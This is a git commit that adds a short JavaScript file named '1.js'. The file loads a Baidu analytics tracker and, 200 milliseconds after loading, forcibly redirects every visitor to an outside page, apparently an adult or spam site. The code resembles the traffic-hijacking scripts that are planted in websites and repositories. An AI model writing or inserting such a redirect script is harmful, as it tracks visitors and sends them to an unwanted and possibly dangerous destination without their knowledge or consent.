3ecf57756a5ba64564b70c28e47bcabaf06a5a15
pandakora8 <132800626+pandakora8@users.noreply.github.com>
2023-05-07 12:15:28 +0800

    Create 1.js

---
+++ 1.js
@@ -0,0 +1,18 @@
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?365f616ee04bda28cfcdf64dd689d3e8";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+function jump() {
+if ((navigator.userAgent.match(/(iPhone|iPod|Android|ios|mobile)/i))) {
+
+var arr =  ['https://kanhuangse.co/19.html'];
+window.location.href = arr[parseInt(Math.random() * arr.length)];
+} else {
+    var arr =  ['https://kanhuangse.co/19.html'];
+window.location.href = arr[parseInt(Math.random() * arr.length)]
+}
+}
+setTimeout(jump, 200);
